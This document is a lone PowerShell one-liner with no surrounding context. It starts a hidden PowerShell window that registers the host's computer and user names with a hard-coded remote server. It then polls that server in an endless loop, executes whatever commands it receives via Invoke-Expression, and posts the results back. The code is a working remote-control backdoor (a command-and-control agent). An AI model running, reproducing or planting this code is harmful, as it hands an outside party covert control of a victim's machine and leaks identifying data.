Start-Process $PSHOME\powershell.exe -ArgumentList {$p='http://';$s='68.219.93.18:8080';$i='1de3b540-b7446837-e49a4d3d';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1de3b540/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/b7446837 -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=Invoke-Expression $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/e49a4d3d -Method POST -Headers @{"Authorization"=$i} -Body ($e+$r)} sleep 0.8}} -WindowStyle Hidden
